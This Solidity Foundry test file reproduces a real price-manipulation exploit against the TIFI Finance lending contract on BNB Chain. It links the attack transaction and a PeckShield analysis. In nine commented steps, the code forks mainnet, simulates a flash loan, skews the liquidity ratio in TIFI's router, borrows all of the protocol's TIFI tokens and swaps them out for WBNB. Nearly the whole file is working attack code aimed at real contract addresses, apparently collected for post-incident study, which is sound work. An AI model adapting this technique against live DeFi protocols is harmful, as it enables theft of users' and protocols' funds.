// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1601492605535399936
// @TX
// https://bscscan.com/tx/0x1c5272ce35338c57c6b9ea710a09766a17bbf14b61438940c3072ed49bfec402

interface TIFIFinance {
    function deposit(address token, uint256 amount) external;

    function borrow(address qToken, uint256 amount) external;
}

contract ContractTest is Test {
    TIFIFinance TIFI = TIFIFinance(0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B);

    // Mock Router for BUSD-to-WBNB
    Uni_Router_V2 TIFIRouter =
        Uni_Router_V2(0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4);
    IERC20 TIFIToken = IERC20(0x17E65E6b9B166Fb8e7c59432F0db126711246BC0);

    // BUSD-to-WBNB
    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23778726);
        cheats.label(address(TIFI), "TIFI");
        cheats.label(address(TIFIRouter), "TIFIRouter");
        cheats.label(address(TIFIToken), "TIFIToken");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(BUSD), "BUSD");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker WBNB balance",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BUSD balance",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker TIFIToken balance",
            TIFIToken.balanceOf(address(this)),
            TIFIToken.decimals()
        );
        emit log_named_decimal_uint(
            "TIFI WBNB balance",
            WBNB.balanceOf(address(TIFI)),
            WBNB.decimals()
        );
        emit log_named_decimal_uint(
            "TIFI BUSD balance",
            BUSD.balanceOf(address(TIFI)),
            BUSD.decimals()
        );
        emit log_named_decimal_uint(
            "TIFI TIFIToken balance",
            TIFIToken.balanceOf(address(TIFI)),
            TIFIToken.decimals()
        );
        emit log_string("");
    }

    function testExploit() public {
        print("Before exploit: ");
        // Prepare tokens
        prepareAction();
        // Manipulation exploit
        exploitAction();
        // Payback flashloan
        postAction();
        print("After exploit: ");
    }

    function prepareAction() internal {
        // Step 1, mock to flashloan WBNB and BUSD.
        deal(address(WBNB), address(this), 5 * 1e18);
        deal(address(BUSD), address(this), 500 * 1e18);

        // Step 2, approve
        BUSD.approve(address(TIFI), type(uint).max);

        // Step 3, deposit to get TIFI-BUSD deposit token
        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));
    }

    function exploitAction() internal {
        // Step 4, approve
        WBNB.approve(address(TIFIRouter), type(uint).max);

        // Step 5, change the liquidity ratio in TIFIRouter
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        TIFIRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Step 6, borrow TIFI Token by the TIFI deposit token.
        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI)));
    }

    function postAction() internal {
        // Step 7, approve
        TIFIToken.approve(address(Router), type(uint).max);

        // Step 8, swap TIFI token to
        address[] memory path = new address[](2);
        path[0] = address(TIFIToken);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIFIToken.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Step 9, mock to payback flashloan
        WBNB.transfer(address(0), 7 * 1e18);
    }
}
